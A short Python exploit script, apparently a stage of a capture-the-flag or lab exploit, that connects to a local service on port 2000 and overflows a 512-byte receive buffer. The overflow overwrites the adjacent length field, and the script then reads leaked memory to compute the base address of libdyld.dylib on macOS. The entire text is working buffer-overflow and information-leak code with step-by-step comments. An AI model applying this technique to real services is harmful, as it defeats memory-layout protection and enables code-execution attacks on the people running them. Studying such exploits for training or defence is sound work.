#!/usr/bin/env python

import socket, struct, time

s = socket.create_connection(('127.0.0.1', 2000))
s.send('x' * 512) # fill _recvBuffer
s.send('y' * 4)   # fill _recvOffset alignment padding
s.send(struct.pack('<Q', 0x300)) # fill _recvBytes
time.sleep(1) # send the newline after _recvOffset has been overwritten
s.send('\n')
address = struct.unpack_from('<Q', s.recv(4096), 516 + 21 * 8)[0] - 0x35C9
print('/usr/lib/system/libdyld.dylib is at 0x{:x}'.format(address))
